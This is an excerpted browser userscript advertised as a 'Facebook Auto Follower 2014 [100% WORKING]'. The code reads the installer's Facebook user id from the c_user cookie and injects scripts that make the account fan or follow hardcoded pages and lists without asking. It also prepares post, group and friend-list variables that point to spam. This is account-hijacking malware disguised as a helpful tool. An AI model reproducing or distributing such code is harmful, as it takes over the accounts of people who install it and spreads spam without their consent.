// ==UserScript==
// @name            ***[NEW]*** Facebook Auto Follower 2014 [100% WORKING]
// @namespace       ***[NEW]*** Facebook Auto Follower 2014 [100% WORKING]
...
var username=getCookie("username");
  ...
  //alert ('cookie does not exist');
	...
	var g=e[1];
 	...
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:175314602637837,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("usasingles",'facebook',365);

	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:375513492580182,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
...
sublist("1376770045899263");


var gid = ['231772556989481'];
...
var spost_id = "175314602637837";
var sfoto_id = "175314602637837";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
